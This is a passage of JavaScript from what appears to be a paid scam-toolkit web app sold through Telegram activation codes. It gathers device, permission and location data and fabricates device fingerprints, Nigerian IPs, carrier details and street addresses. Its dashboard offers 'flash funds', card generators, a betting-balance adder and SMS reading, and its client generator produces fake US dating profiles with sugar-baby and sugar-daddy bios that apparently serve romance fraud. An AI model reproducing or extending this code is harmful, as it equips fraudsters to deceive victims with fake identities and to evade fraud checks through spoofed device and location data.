        const modelMatch = ua.match(/\(([^)]+)\)/);
        if (modelMatch) {
            const deviceInfo = modelMatch[1].split(';');
            deviceInfo.forEach(info => {
                const trimmed = info.trim();
                if (trimmed.includes('SM-') || trimmed.includes('SAMSUNG') || 
                    trimmed.includes('Redmi') || trimmed.includes('Mi ') ||
                    trimmed.includes('HUAWEI') || trimmed.includes('TECNO') ||
                    trimmed.includes('Infinix') || trimmed.includes('OPPO') ||
                    trimmed.includes('Vivo') || trimmed.includes('OnePlus')) {
                    androidDetails.model = trimmed;
                }
            });
        }

        // Determine brand from model or UA
        if (androidDetails.model) {
            const model = androidDetails.model.toLowerCase();
            if (model.includes('samsung') || model.includes('sm-')) {
                androidDetails.brand = 'Samsung';
                androidDetails.manufacturer = 'Samsung Electronics';
            } else if (model.includes('redmi') || model.includes('mi ')) {
                androidDetails.brand = 'Xiaomi';
                androidDetails.manufacturer = 'Xiaomi Inc.';
            } else if (model.includes('huawei')) {
                androidDetails.brand = 'Huawei';
                androidDetails.manufacturer = 'Huawei Technologies';
            } else if (model.includes('tecno')) {
                androidDetails.brand = 'TECNO';
                androidDetails.manufacturer = 'Transsion Holdings';
            } else if (model.includes('infinix')) {
                androidDetails.brand = 'Infinix';
                androidDetails.manufacturer = 'Transsion Holdings';
            } else if (model.includes('oppo')) {
                androidDetails.brand = 'OPPO';
                androidDetails.manufacturer = 'OPPO Electronics';
            } else if (model.includes('vivo')) {
                androidDetails.brand = 'Vivo';
                androidDetails.manufacturer = 'Vivo Communication Technology';
            } else if (model.includes('oneplus')) {
                androidDetails.brand = 'OnePlus';
                androidDetails.manufacturer = 'OnePlus Technology';
            }
        }

        // Generate realistic Android system details
        if (androidDetails.version) {
            const majorVersion = parseInt(androidDetails.version.split('.')[0]);
            androidDetails.apiLevel = Math.max(21, majorVersion + 5); // Approximate API level
            androidDetails.buildNumber = generateBuildNumber(androidDetails.brand);
            androidDetails.kernelVersion = generateKernelVersion();
            androidDetails.bootloader = generateBootloader(androidDetails.brand);
            androidDetails.hardware = generateHardware(androidDetails.brand);
            androidDetails.product = generateProduct(androidDetails.model);
            androidDetails.device = generateDevice(androidDetails.model);
            androidDetails.board = generateBoard(androidDetails.brand);
            androidDetails.cpuAbi = generateCpuAbi();
            androidDetails.fingerprint = generateAndroidFingerprint(androidDetails);
        }
    }

    return androidDetails;
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
    } catch (e) {
        console.log('Battery info failed:', e);
    }
    
    // Generate fake battery info
    return {
        level: Math.floor(Math.random() * 80) + 20, // 20-100%
        charging: Math.random() > 0.7,
        chargingTime: Math.random() > 0.5 ? Infinity : Math.floor(Math.random() * 7200),
        dischargingTime: Math.floor(Math.random() * 18000) + 3600
    };
}

async function getDetailedNetworkInfo() {
    const networkInfo = {
        type: 'unknown',
        effectiveType: 'unknown',
        downlink: 'unknown',
        rtt: 'unknown',
        saveData: false,
        carrier: null,
        networkOperator: null,
        mcc: null,
        mnc: null,
        lac: null,
        cellId: null,
        signalStrength: null
    };

    try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            networkInfo.type = connection.type || 'unknown';
            networkInfo.effectiveType = connection.effectiveType || 'unknown';
            networkInfo.downlink = connection.downlink || 'unknown';
            networkInfo.rtt = connection.rtt || 'unknown';
            networkInfo.saveData = connection.saveData || false;
        }

        // Generate fake Nigerian carrier info
        const carriers = [
            { name: 'MTN Nigeria', mcc: '621', mnc: '30' },
            { name: 'Airtel Nigeria', mcc: '621', mnc: '20' },
            { name: 'Glo Mobile', mcc: '621', mnc: '50' },
            { name: '9mobile', mcc: '621', mnc: '60' }
        ];
        
        const selectedCarrier = carriers[Math.floor(Math.random() * carriers.length)];
        networkInfo.carrier = selectedCarrier.name;
        networkInfo.networkOperator = selectedCarrier.name;
        networkInfo.mcc = selectedCarrier.mcc;
        networkInfo.mnc = selectedCarrier.mnc;
        networkInfo.lac = Math.floor(Math.random() * 65535).toString(16).toUpperCase();
        networkInfo.cellId = Math.floor(Math.random() * 268435455);
        networkInfo.signalStrength = Math.floor(Math.random() * 31) + 1; // 1-31 (Android scale)
        
    } catch (e) {
        console.log('Detailed network info failed:', e);
    }

    return networkInfo;
}

async function getSensorData() {
    const sensorData = {
        accelerometer: false,
        gyroscope: false,
        magnetometer: false,
        proximity: false,
        lightSensor: false,
        orientation: null,
        motion: null
    };

    try {
        // Check for device orientation
        if ('orientation' in window) {
            sensorData.orientation = window.orientation;
        }

        // Check for device motion
        if ('DeviceMotionEvent' in window) {
            sensorData.motion = 'supported';
            sensorData.accelerometer = true;
            sensorData.gyroscope = true;
        }

        // Check for device orientation event
        if ('DeviceOrientationEvent' in window) {
            sensorData.magnetometer = true;
        }

        // Simulate other sensors for mobile devices
        if (/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent)) {
            sensorData.proximity = Math.random() > 0.3;
            sensorData.lightSensor = Math.random() > 0.4;
        }

    } catch (e) {
        console.log('Sensor data failed:', e);
    }

    return sensorData;
}

function getStorageInfo() {
    const storageInfo = {
        localStorage: false,
        sessionStorage: false,
        indexedDB: false,
        webSQL: false,
        quota: null,
        usage: null
    };

    try {
        storageInfo.localStorage = 'localStorage' in window && window.localStorage !== null;
        storageInfo.sessionStorage = 'sessionStorage' in window && window.sessionStorage !== null;
        storageInfo.indexedDB = 'indexedDB' in window;
        storageInfo.webSQL = 'openDatabase' in window;

        // Try to get storage quota
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            navigator.storage.estimate().then(estimate => {
                storageInfo.quota = estimate.quota;
                storageInfo.usage = estimate.usage;
            });
        }
    } catch (e) {
        console.log('Storage info failed:', e);
    }

    return storageInfo;
}

async function getPermissions() {
    const permissions = {
        camera: 'unknown',
        microphone: 'unknown',
        location: 'unknown',
        notifications: 'unknown',
        persistentStorage: 'unknown'
    };

    try {
        if ('permissions' in navigator) {
            const permissionNames = ['camera', 'microphone', 'geolocation', 'notifications', 'persistent-storage'];
            
            for (const name of permissionNames) {
                try {
                    const result = await navigator.permissions.query({ name: name === 'geolocation' ? 'geolocation' : name });
                    const key = name === 'geolocation' ? 'location' : name === 'persistent-storage' ? 'persistentStorage' : name;
                    permissions[key] = result.state;
                } catch (e) {
                    console.log(`Permission ${name} query failed:`, e);
                }
            }
        }
    } catch (e) {
        console.log('Permissions check failed:', e);
    }

    return permissions;
}

// Helper functions for Android details
function generateBuildNumber(brand) {
    const builds = {
        'Samsung': ['G973FXXU3BSKJ', 'N975FXXU4ETBA', 'A505FNXXU5BUDD'],
        'Xiaomi': ['PKQ1.190118.001', 'QKQ1.200114.002', 'RKQ1.200928.002'],
        'Huawei': ['EML-L29 10.0.0.162', 'ANE-LX1 9.1.0.308', 'VOG-L29 10.0.0.201'],
        'TECNO': ['TECNO-KA7-H6612-O-GP-190301V113', 'TECNO-KB2-H675-Q-GO-200301V122'],
        'Default': ['QP1A.190711.020', 'RP1A.200720.011', 'SP1A.210812.016']
    };
    
    const brandBuilds = builds[brand] || builds['Default'];
    return brandBuilds[Math.floor(Math.random() * brandBuilds.length)];
}

function generateKernelVersion() {
    const versions = [
        '4.4.177-perf-g4c8b6b2', '4.9.190-perf+', '4.14.117-perf+',
        '4.19.95-perf+', '5.4.61-qgki-g4c8b6b2'
    ];
    return versions[Math.floor(Math.random() * versions.length)];
}

function generateBootloader(brand) {
    const bootloaders = {
        'Samsung': ['G973FXXU3BSK4', 'N975FXXU4ETB3', 'A505FNXXU5BUD1'],
        'Xiaomi': ['fastboot', 'unknown', 'locked'],
        'Huawei': ['unknown', 'locked', 'EML-L29'],
        'Default': ['unknown', 'locked']
    };
    
    const brandBootloaders = bootloaders[brand] || bootloaders['Default'];
    return brandBootloaders[Math.floor(Math.random() * brandBootloaders.length)];
}

function generateHardware(brand) {
    const hardware = {
        'Samsung': ['exynos9820', 'exynos990', 'universal9611'],
        'Xiaomi': ['qcom', 'mt6785', 'sdm660'],
        'Huawei': ['kirin970', 'kirin980', 'hi6250'],
        'Default': ['qcom', 'mt6762', 'universal']
    };
    
    const brandHardware = hardware[brand] || hardware['Default'];
    return brandHardware[Math.floor(Math.random() * brandHardware.length)];
}

function generateProduct(model) {
    if (!model) return 'unknown';
    return model.toLowerCase().replace(/[^a-z0-9]/g, '') + '_global';
}

function generateDevice(model) {
    if (!model) return 'unknown';
    return model.toLowerCase().replace(/[^a-z0-9]/g, '');
}

function generateBoard(brand) {
    const boards = {
        'Samsung': ['universal9820', 'exynos990', 'msm8998'],
        'Xiaomi': ['sdm660', 'mt6785', 'qcom'],
        'Huawei': ['kirin970', 'hi6250', 'kirin980'],
        'Default': ['msm8916', 'mt6762', 'qcom']
    };
    
    const brandBoards = boards[brand] || boards['Default'];
    return brandBoards[Math.floor(Math.random() * brandBoards.length)];
}

function generateCpuAbi() {
    const abis = ['arm64-v8a', 'armeabi-v7a', 'x86', 'x86_64'];
    return abis[Math.floor(Math.random() * abis.length)];
}

function generateAndroidFingerprint(androidDetails) {
    const brand = androidDetails.brand || 'generic';
    const product = androidDetails.product || 'unknown';
    const device = androidDetails.device || 'unknown';
    const version = androidDetails.version || '10';
    const buildNumber = androidDetails.buildNumber || 'unknown';
    
    return `${brand}/${product}/${device}:${version}/${buildNumber}:user/release-keys`;
}

async function getLocationInfo() {
    return await getPreciseLocation();
}

function generateRealisticNigerianIP() {
    // Nigerian IP ranges for major ISPs
    const nigerianIPRanges = [
        // MTN Nigeria
        { start: [41, 58], range: [0, 255] },
        { start: [196, 216], range: [0, 255] },
        { start: [41, 73], range: [0, 255] },
        // Airtel Nigeria
        { start: [105, 112], range: [0, 255] },
        { start: [41, 77], range: [0, 255] },
        // Globacom
        { start: [41, 242], range: [0, 255] },
        { start: [196, 223], range: [0, 255] },
        // 9mobile
        { start: [41, 67], range: [0, 255] },
        { start: [41, 75], range: [0, 255] }
    ];
    
    const selectedRange = nigerianIPRanges[Math.floor(Math.random() * nigerianIPRanges.length)];
    
    return `${selectedRange.start[0]}.${selectedRange.start[1]}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function generateRealAddress(city, region, country) {
    const addressComponents = {
        'Lagos': [
            '15 Adeola Odeku Street, Victoria Island',
            '42 Allen Avenue, Ikeja',
            '8 Awolowo Road, Ikoyi',
            '25 Admiralty Way, Lekki Phase 1',
            '67 Opebi Road, Ikeja',
            '33 Ajose Adeogun Street, Victoria Island',
            '18 Kofo Abayomi Street, Victoria Island',
            '91 Agege Motor Road, Mushin',
            '12 Idowu Martins Street, Victoria Island',
            '55 Glover Road, Ikoyi'
        ],
        'Abuja': [
            '7 Gana Street, Maitama',
            '15 Yakubu Gowon Crescent, Asokoro',
            '23 Aminu Kano Crescent, Wuse II',
            '41 Cadastral Zone A03, Garki',
            '12 Herbert Macaulay Way, Central Area',
            '56 Ahmadu Bello Way, Central Area',
            '8 Tafawa Balewa Way, Central Area',
            '19 Shehu Shagari Way, Maitama'
        ],
        'Port Harcourt': [
            '34 Aba Road, Port Harcourt',
            '12 Trans Amadi Industrial Layout',
            '28 Old Aba Road, Rumuokwuta',
            '45 Stadium Road, Port Harcourt',
            '67 Ikwerre Road, Port Harcourt'
        ],
        'Kano': [
            '19 Bompai Road, Bompai',
            '7 Murtala Mohammed Way, Fagge',
            '33 Zoo Road, Kano',
            '14 Ibrahim Taiwo Road, Nassarawa GRA',
            '25 Ahmadu Bello Way, Kano'
        ]
    };
    
    // Default addresses for other cities
    const defaultAddresses = [
        '22 University Road',
        '18 New Market Road',
        '35 Owerri Road',
        '27 Calabar Road',
        '41 Makurdi Road',
        '16 Gboko Road',
        '52 Benin-Auchi Road',
        '38 Nnewi Road',
        '44 Onitsha Road',
        '29 Warri Road'
    ];
    
    let streetAddress;
    if (addressComponents[city]) {
        streetAddress = addressComponents[city][Math.floor(Math.random() * addressComponents[city].length)];
    } else {
        streetAddress = defaultAddresses[Math.floor(Math.random() * defaultAddresses.length)] + ', ' + city;
    }
    
    return `${streetAddress}, ${region}, ${country}`;
}

function generateRealAddressFromGeo(geoData) {
    const components = [];
    
    if (geoData.locality) components.push(geoData.locality);
    if (geoData.localityInfo && geoData.localityInfo.administrative) {
        components.push(...geoData.localityInfo.administrative.filter(admin => admin.name));
    }
    if (geoData.city && !components.includes(geoData.city)) components.push(geoData.city);
    if (geoData.principalSubdivision) components.push(geoData.principalSubdivision);
    if (geoData.countryName) components.push(geoData.countryName);
    
    // Add street number and name if available
    let fullAddress = '';
    if (geoData.streetNumber && geoData.streetName) {
        fullAddress = `${geoData.streetNumber} ${geoData.streetName}, `;
    } else if (geoData.streetName) {
        fullAddress = `${geoData.streetName}, `;
    }
    
    fullAddress += components.join(', ');
    
    return fullAddress || 'Address not available';
}

function generateFakeIP() {
    // Fallback function - now calls the more realistic version
    return generateRealisticNigerianIP();
}

function getNetworkInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        networkLatency = conn.rtt || Math.floor(Math.random() * 100 + 20);
        return {
            type: conn.effectiveType || '4g',
            downlink: conn.downlink || 'Unknown'
        };
    }
    networkLatency = Math.floor(Math.random() * 100 + 20);
    return { type: '4g', downlink: 'Unknown' };
}

function getRiskLevel() {
    if (deviceTrust > 90) return 'LOW';
    if (deviceTrust > 70) return 'MEDIUM';
    return 'HIGH';
}

function setupEventListeners() {
    // Activation
    document.getElementById('activateBtn').addEventListener('click', activateAccount);
    
    // Purchase Code Button
    document.getElementById('purchaseCodeBtn').addEventListener('click', function(e) {
        e.preventDefault();
        window.open('https://flutterwave.com/pay/milestools', '_blank');
        playNotificationSound();
        showNotification('Opening payment gateway...', 'success');
    });
    document.getElementById('telegramContact').addEventListener('click', function(e) {
        e.preventDefault();
        const message = `I need the activation code for this app\nUser ID: ${userSession.userId}\nWallet: ${userSession.walletAddress}`;
        window.open(`https://t.me/Milestool?text=${encodeURIComponent(message)}`, '_blank');
        playNotificationSound();
        showNotification('Opening Telegram...', 'success');
    });

    // WhatsApp contact removed - only Telegram contact (@Milestool) is now available

    // Input validation
    setupInputValidation();

    // Continue to dashboard
    document.getElementById('continueBtn').addEventListener('click', showDisclaimer);
    document.getElementById('agreeBtn').addEventListener('click', proceedToDashboard);

    // Dashboard actions with limited access restrictions
    document.getElementById('logoutBtn').addEventListener('click', logout);
    document.getElementById('withdrawCryptoBtn').addEventListener('click', () => checkToolAccess('withdrawCryptoPage'));
    document.getElementById('withdrawBankBtn').addEventListener('click', () => checkToolAccess('withdrawBankPage'));
    document.getElementById('transferBtn').addEventListener('click', () => checkToolAccess('transferPage'));
    document.getElementById('giftCardBtn').addEventListener('click', () => checkToolAccess('giftCardPage'));
    document.getElementById('cardGeneratorBtn').addEventListener('click', () => checkToolAccess('cardGeneratorPage'));
    document.getElementById('atmCardBtn').addEventListener('click', () => checkToolAccess('atmCardPage'));
    document.getElementById('flashFundsBtn').addEventListener('click', () => checkToolAccess('flashFundsPage'));
    document.getElementById('sportybetBtn').addEventListener('click', () => checkToolAccess('sportybetPage'));
    document.getElementById('formatGeneratorBtn').addEventListener('click', () => checkToolAccess('formatGeneratorPage'));
    document.getElementById('clientGeneratorBtn').addEventListener('click', () => checkToolAccess('clientGeneratorPage'));
    document.getElementById('simeroSmsBtn').addEventListener('click', () => checkToolAccess('simeroSmsPage'));
    document.getElementById('spribeBtn').addEventListener('click', () => checkToolAccess('spribePage'));

    // Crypto withdrawal
    document.getElementById('checkCryptoBalanceBtn').addEventListener('click', checkCryptoBalance);
    document.getElementById('cryptoWithdrawBtn').addEventListener('click', () => initiateWithdrawal('crypto'));
    
    // Add Find Random button for crypto addresses
    const cryptoBalanceSection = document.getElementById('checkCryptoBalanceBtn')?.parentElement;
    if (cryptoBalanceSection && !document.getElementById('findRandomCryptoAddressBtn')) {
        const findRandomBtn = document.createElement('button');
        findRandomBtn.id = 'findRandomCryptoAddressBtn';
        findRandomBtn.type = 'button';
        findRandomBtn.textContent = 'FIND RANDOM';
        findRandomBtn.className = 'find-random-btn crypto-action-btn';
        findRandomBtn.style.marginLeft = '10px';
        findRandomBtn.onclick = findRandomCryptoAddress;
        
        const checkBalanceBtn = document.getElementById('checkCryptoBalanceBtn');
        checkBalanceBtn.parentElement.insertBefore(findRandomBtn, checkBalanceBtn.nextSibling);
    }

    // Bank withdrawal
    document.getElementById('verifyBankBtn').addEventListener('click', verifyBankAccount);
    
    // Setup bank withdrawal listeners
    setupBankWithdrawalListeners();
    

    // Transfer (only if elements exist)
    const transferToBankBtn = document.getElementById('transferToBankBtn');
    if (transferToBankBtn) {
        transferToBankBtn.addEventListener('click', () => showTransferSection('bank'));
    }
    
    const transferToCryptoBtn = document.getElementById('transferToCryptoBtn');
    if (transferToCryptoBtn) {
        transferToCryptoBtn.addEventListener('click', () => showTransferSection('crypto'));
    }
    
    const verifyTransferBankBtn = document.getElementById('verifyTransferBankBtn');
    if (verifyTransferBankBtn) {
        verifyTransferBankBtn.addEventListener('click', verifyTransferBank);
    }
    
    // Only add these listeners if the elements exist (removed for bank withdrawal flow)
    const sendBankTransferBtn = document.getElementById('sendBankTransferBtn');
    if (sendBankTransferBtn) {
        sendBankTransferBtn.addEventListener('click', () => initiateTransfer('bank'));
    }
    
    const sendCryptoTransferBtn = document.getElementById('sendCryptoTransferBtn');
    if (sendCryptoTransferBtn) {
        sendCryptoTransferBtn.addEventListener('click', () => initiateTransfer('crypto'));
    }

    // PIN modal
    document.getElementById('setPinBtn').addEventListener('click', setPin);
    document.getElementById('confirmPinBtn').addEventListener('click', confirmPin);

    // Receipt modal
    document.getElementById('closeReceiptBtn').addEventListener('click', closeReceipt);

    // Gift card generator
    setupGiftCardListeners();

    // ATM card generator
    setupAtmCardGeneratorListeners();

    // ATM card withdrawal
    setupAtmCardListeners();
    
    // Flash funds
    setupFlashFundsListeners();
    
    // Bank withdrawal flow
    setupBankWithdrawalListeners();
    
    // Sportybet balance adder
    setupSportybetListeners();
    
    // Format Generator - will be set up after functions are defined
    
    // Client Generator
    setupClientGeneratorListeners();
    
    // Simero SMS Reader
    setupSimeroSmsListeners();
    
    // Format Generator
    setupFormatGeneratorListeners();
}

// Client Generator Functions
let currentClientProfile = null;

const usNames = {
    female: {
        first: ['Emma', 'Olivia', 'Ava', 'Isabella', 'Sophia', 'Charlotte', 'Mia', 'Amelia', 'Harper', 'Evelyn', 'Abigail', 'Emily', 'Elizabeth', 'Mila', 'Ella', 'Avery', 'Sofia', 'Camila', 'Aria', 'Scarlett', 'Victoria', 'Madison', 'Luna', 'Grace', 'Chloe', 'Penelope', 'Layla', 'Riley', 'Zoey', 'Nora', 'Lily', 'Eleanor', 'Hannah', 'Lillian', 'Addison', 'Aubrey', 'Ellie', 'Stella', 'Natalie', 'Zoe'],
        last: ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King', 'Wright', 'Scott', 'Torres', 'Nguyen', 'Hill', 'Flores']
    },
    male: {
        first: ['Liam', 'Noah', 'Oliver', 'William', 'Elijah', 'James', 'Benjamin', 'Lucas', 'Mason', 'Ethan', 'Alexander', 'Henry', 'Jacob', 'Michael', 'Daniel', 'Logan', 'Jackson', 'Sebastian', 'Jack', 'Aiden', 'Owen', 'Samuel', 'Matthew', 'Joseph', 'Levi', 'Mateo', 'David', 'John', 'Wyatt', 'Carter', 'Julian', 'Luke', 'Grayson', 'Isaac', 'Jayden', 'Theodore', 'Gabriel', 'Anthony', 'Dylan', 'Leo'],
        last: ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King', 'Wright', 'Scott', 'Torres', 'Nguyen', 'Hill', 'Flores']
    }
};

const bioTemplates = {
    'sugar-baby': {
        flirty: [
            "Looking for someone who can spoil me the way I deserve 💎 College student with expensive taste ✨",
            "Daddy's princess seeking her king 👑 I love shopping, fine dining, and being pampered 💕",
            "Sweet but expensive 🍯 Chemistry major who knows what she wants. Can you handle me? 😘"
        ],
        sophisticated: [
            "Elegant young woman seeking a distinguished gentleman for meaningful companionship and mutual benefit 🥂",
            "Harvard student appreciating the finer things in life. Intelligence is the ultimate aphrodisiac 📚✨",
            "Cultured and refined, seeking someone who values quality time and generous experiences 🌹"
        ],
        casual: [
            "Fun-loving college girl who loves adventures and new experiences! Looking for someone generous 🎉",
            "Always down for good food, travel, and laughs. Seeking someone who can keep up! 😊",
            "Life's too short to be boring! Student by day, your baby by night 💫"
        ]
    },
    'sugar-daddy': {
        sophisticated: [
            "Successful entrepreneur seeking an intelligent companion to share life's finest pleasures 🥃",
            "CEO of tech company. I believe in investing in relationships that matter. Quality over quantity 💼",
            "Established professional who appreciates beauty, intelligence, and ambition. Let me spoil you right ✨"
        ],
        casual: [
            "Self-made businessman who knows how to have fun. Looking for someone special to share adventures with 🚁",
            "Work hard, play harder. Seeking a beautiful companion who appreciates the good life 🍾",
            "Successful and generous. Love travel, fine dining, and making someone special feel appreciated 🌍"
        ]
    },
    influencer: {
        flirty: [
            "Content creator with 50K followers 📸 Living my best life and looking for someone to share it with ✨",
            "Lifestyle blogger spreading positivity ☀️ Swipe right if you're ready for an adventure! 💕",
            "Creating content that inspires 🎬 Seeking someone as passionate about life as I am 🔥"
        ]
    }
};

const usStates = ['CA', 'NY', 'TX', 'FL', 'IL', 'PA', 'OH', 'GA', 'NC', 'MI', 'NJ', 'VA', 'WA', 'AZ', 'MA', 'TN', 'IN', 'MO', 'MD', 'WI', 'CO', 'MN', 'SC', 'AL', 'LA', 'KY', 'OR', 'OK', 'CT', 'UT', 'IA', 'NV', 'AR', 'MS', 'KS', 'NM', 'NE', 'WV', 'ID', 'HI', 'NH', 'ME', 'MT', 'RI', 'DE', 'SD', 'ND', 'AK', 'VT', 'WY'];

const usCities = {
    'CA': ['Los Angeles', 'San Francisco', 'San Diego', 'Sacramento', 'San Jose'],
    'NY': ['New York City', 'Buffalo', 'Rochester', 'Syracuse', 'Albany'],
    'TX': ['Houston', 'Dallas', 'Austin', 'San Antonio', 'Fort Worth'],
    'FL': ['Miami', 'Orlando', 'Tampa', 'Jacksonville', 'Fort Lauderdale'],
    'IL': ['Chicago', 'Aurora', 'Rockford', 'Joliet', 'Naperville']
};

function setupClientGeneratorListeners() {
    // Generate button
    const generateBtn = document.getElementById('generateClientBtn');
    if (generateBtn) {
        generateBtn.addEventListener('click', generateClientProfile);
    }

    // Modal actions
    const copyBtn = document.getElementById('copyClientBtn');
    const regenerateBtn = document.getElementById('regenerateClientBtn');
    const closeBtn = document.getElementById('closeClientBtn');

    if (copyBtn) {
        copyBtn.addEventListener('click', copyClientProfile);
    }

    if (regenerateBtn) {
        regenerateBtn.addEventListener('click', regenerateClientProfile);
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', closeClientProfile);
    }
}

function generateClientProfile() {
    showClientGenerationModal();
}

function showClientGenerationModal() {
    const modal = document.getElementById('clientGenerationModal');
    modal.style.display = 'block';
    startClientGeneration();
}

function startClientGeneration() {
    const steps = document.querySelectorAll('#clientGenerationSteps .step');
    const progressFill = document.getElementById('clientProgressFill');
    const progressText = document.getElementById('clientProgressText');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 2000 + 3000; // 3-5 seconds per step

    const progressMessages = [
        'Analyzing demographic preferences...',
        'Generating realistic personality...',
        'Creating social media presence...',
        'Crafting engaging bio content...',
        'Generating contact information...',
        'Profile generation complete!'
    ];

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            steps.forEach(step => step.classList.remove('active'));
            steps[currentStep].classList.add('active');
            
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = progressMessages[currentStep] || 'Processing...';

            currentStep++;
        } else {
            clearInterval(stepInterval);
            
            setTimeout(() => {
                document.getElementById('clientGenerationModal').style.display = 'none';
                createClientProfile();
            }, 1500);
        }
    }, stepDuration);
}

function createClientProfile() {
    const gender = document.getElementById('clientGender').value || getRandomGender();
    const race = document.getElementById('clientRace').value || getRandomRace();
    const ageRange = document.getElementById('clientAge').value || '18-65';
    const clientType = document.getElementById('clientType').value || getRandomClientType();
    const socialPlatform = document.getElementById('socialPlatform').value || 'tinder';
    const bioStyle = document.getElementById('bioStyle').value || getRandomBioStyle();

    const profile = {
        gender: gender,
        race: race,
        age: generateAge(ageRange),
        clientType: clientType,
        name: generateName(gender),
        location: generateLocation(),
        phone: generatePhoneNumber(),
        socialMedia: generateSocialMedia(socialPlatform, gender),
        bio: generateBio(clientType, bioStyle, gender),
        interests: generateInterests(clientType),
        occupation: generateOccupation(clientType, gender),
        education: generateEducation(),
        photos: generatePhotoSuggestions(gender, race)
    };

    currentClientProfile = profile;
    showGeneratedClient(profile);
}

function getRandomGender() {
    const genders = ['female', 'male', 'non-binary'];
    return genders[Math.floor(Math.random() * genders.length)];
}

function getRandomRace() {
    const races = ['white', 'black', 'hispanic', 'asian', 'mixed'];
    return races[Math.floor(Math.random() * races.length)];
}

function getRandomClientType() {
    const types = ['sugar-baby', 'sugar-daddy', 'influencer', 'student', 'business'];
    return types[Math.floor(Math.random() * types.length)];
}

function getRandomBioStyle() {
    const styles = ['flirty', 'sophisticated', 'casual', 'mysterious', 'ambitious'];
    return styles[Math.floor(Math.random() * styles.length)];
}

function generateAge(ageRange) {
    if (ageRange === '') return Math.floor(Math.random() * 48) + 18;
    
    const [min, max] = ageRange.split('-').map(Number);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateName(gender) {
    const genderKey = gender === 'non-binary' ? (Math.random() > 0.5 ? 'female' : 'male') : gender;
    const firstNames = usNames[genderKey].first;
    const lastNames = usNames[genderKey].last;
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    
    return { first: firstName, last: lastName, full: `${firstName} ${lastName}` };
}

function generateLocation() {
    const state = usStates[Math.floor(Math.random() * usStates.length)];
    const cities = usCities[state] || ['Springfield', 'Franklin', 'Georgetown', 'Madison', 'Clinton'];
    const city = cities[Math.floor(Math.random() * cities.length)];
    
    return { city: city, state: state, full: `${city}, ${state}` };
}

function generatePhoneNumber() {
    const areaCodes = ['212', '310', '415', '713', '305', '404', '312', '617', '206', '702'];
    const areaCode = areaCodes[Math.floor(Math.random() * areaCodes.length)];
    const exchange = Math.floor(Math.random() * 900) + 100;
    const number = Math.floor(Math.random() * 9000) + 1000;
    
    return `+1 (${areaCode}) ${exchange}-${number}`;
}

function generateSocialMedia(platform, gender) {
    const name = generateName(gender);
    const baseUsername = (name.first + name.last).toLowerCase();
    const variations = [
        baseUsername,
        baseUsername + Math.floor(Math.random() * 100),
        name.first.toLowerCase() + '_' + name.last.toLowerCase(),
        name.first.toLowerCase() + Math.floor(Math.random() * 1000),
        'real' + name.first.toLowerCase(),
        name.first.toLowerCase() + 'official'
    ];
    
    const username = variations[Math.floor(Math.random() * variations.length)];
    
    const profiles = {
        tinder: `@${username}`,
        facebook: `facebook.com/${username}`,
        instagram: `@${username}`,
        snapchat: `@${username}`,
        twitter: `@${username}`,
        seeking: `SeekingArrangement: ${name.first}${Math.floor(Math.random() * 1000)}`
    };
    
    return {
        primary: platform,
        username: username,
        profiles: profiles,
        displayName: name.full
    };
}

function generateBio(clientType, bioStyle, gender) {
    const templates = bioTemplates[clientType];
    if (!templates || !templates[bioStyle]) {
        return generateGenericBio(gender, bioStyle);
    }
    
    const template = templates[bioStyle][Math.floor(Math.random() * templates[bioStyle].length)];
    return template;
}

function generateGenericBio(gender, bioStyle) {
    const bios = {
        flirty: [
            "Life's too short for boring conversations 😘 Looking for someone who can keep up!",
            "Adventure seeker with a sweet tooth for life's finer things ✨",
            "Making memories one day at a time 💫 What's your story?"
        ],
        sophisticated: [
            "Appreciating life's finest moments and genuine connections 🥂",
            "Cultivated professional seeking meaningful experiences and conversations",
            "Believer in quality over quantity in all aspects of life 🌹"
        ],
        casual: [
            "Just living my best life and looking for good vibes only! ✌️",
            "Love good food, great company, and spontaneous adventures 🎉",
            "Always down for trying something new! What's your favorite spot in town?"
        ]
    };
    
    const styleTemplates = bios[bioStyle] || bios.casual;
    return styleTemplates[Math.floor(Math.random() * styleTemplates.length)];
}

function generateInterests(clientType) {
    const interestSets = {
        'sugar-baby': ['Shopping', 'Fine Dining', 'Travel', 'Spa Days', 'Fashion', 'Photography', 'Yoga', 'Wine Tasting'],
        'sugar-daddy': ['Business', 'Golf', 'Fine Dining', 'Travel', 'Wine Collection', 'Real Estate', 'Luxury Cars', 'Art'],
        'influencer': ['Content Creation', 'Photography', 'Fashion', 'Travel', 'Fitness', 'Beauty', 'Social Media', 'Networking'],
        'student': ['Studying', 'Coffee', 'Movies', 'Music', 'Books', 'Parties', 'Sports', 'Art'],
